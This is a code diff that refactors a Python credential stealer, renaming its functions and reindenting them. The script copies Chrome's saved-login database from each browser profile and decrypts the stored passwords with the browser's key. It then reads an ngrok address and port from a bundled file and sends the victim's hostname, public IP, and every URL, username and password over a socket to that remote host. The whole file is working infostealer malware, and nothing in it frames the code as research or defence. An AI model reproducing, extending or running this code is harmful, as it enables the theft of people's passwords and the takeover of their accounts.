@@ -42,7 +42,6 @@ def decrypt_password(ciphertext, secret_key):
     
 def get_db_connection(chrome_path_login_db):
     try:
-        #print(chrome_path_login_db)
         shutil.copy2(chrome_path_login_db, "Loginvault.db") 
         return sqlite3.connect("Loginvault.db")
     except Exception as e:
@@ -50,63 +49,61 @@ def get_db_connection(chrome_path_login_db):
         print("[ERR] Chrome database cannot be found")
         return None
         
-def getPasswords():
+def get_passwords():
     try:
-            urls = []
-            usernames = []
-            passwords = []
-            secret_key = get_secret_key()
-            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
-            for folder in folders:
-                chrome_path_login_db = os.path.normpath(R"%s\%s\Login Data"%(CHROME_PATH,folder))
-                conn = get_db_connection(chrome_path_login_db)
-                if(secret_key and conn):
-                    cursor = conn.cursor()
-                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-                    for login in cursor.fetchall():
-                        url = login[0]
-                        username = login[1]
-                        ciphertext = login[2]
-                        if(url!="" and username!="" and ciphertext!=""):                                                          
-                            urls.append(url)
-                            usernames.append(username)
-                            passwords.append(decrypt_password(ciphertext, secret_key))
-                    cursor.close()
-                    conn.close()
-                    os.remove("Loginvault.db")
-            return urls, usernames, passwords
+        urls = []
+        usernames = []
+        passwords = []
+        secret_key = get_secret_key()
+        folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
+        for folder in folders:
+            chrome_path_login_db = os.path.normpath(R"%s\%s\Login Data"%(CHROME_PATH,folder))
+            conn = get_db_connection(chrome_path_login_db)
+            if(secret_key and conn):
+                cursor = conn.cursor()
+                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+                for login in cursor.fetchall():
+                    url = login[0]
+                    username = login[1]
+                    ciphertext = login[2]
+                    if(url!="" and username!="" and ciphertext!=""):                                                          
+                        urls.append(url)
+                        usernames.append(username)
+                        passwords.append(decrypt_password(ciphertext, secret_key))
+                cursor.close()
+                conn.close()
+                os.remove("Loginvault.db")
+        return urls, usernames, passwords
             
     except Exception as e:
         print("[ERR] %s"%str(e))
 
-
-def resourcePath(relative_path):
+def resource_path(relative_path):
     if hasattr(sys, '_MEIPASS'):
         base_path = sys._MEIPASS
     else:
         base_path = os.path.abspath(".")
     return os.path.join(base_path, relative_path)
 
-def getNgrokIP():
-    with open(resourcePath("ip.txt"), "r") as file:
+def get_ngrok_ip():
+    with open(resource_path("ip.txt"), "r") as file:
         ngrokIP = []
         zm = file.readline()
         ngrokIP.append(zm[6:20])
         ngrokIP.append(zm[21:])
         return ngrokIP
 
-
-def getPublicIP():
+def get_public_ip():
     response = requests.get('https://api64.ipify.org?format=json')
     data = response.json()
     return data['ip']
     
 if __name__ == "__main__":
-    ngrokIP = getNgrokIP()
-    urls, usernames, passwords = getPasswords()
+    ngrokIP = get_ngrok_ip()
+    urls, usernames, passwords = get_passwords()
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.connect((f'{ngrokIP[0]}', int(ngrokIP[1])))
-        s.send(f"{len(urls)}, {getPublicIP()}, {socket.gethostname()}".encode())
+        s.send(f"{len(urls)}, {get_public_ip()}, {socket.gethostname()}".encode())
         zm = s.recv(8).decode()
         for i in range(len(urls)):
             s.send(f"{urls[i]} {usernames[i]} {passwords[i]}".encode())
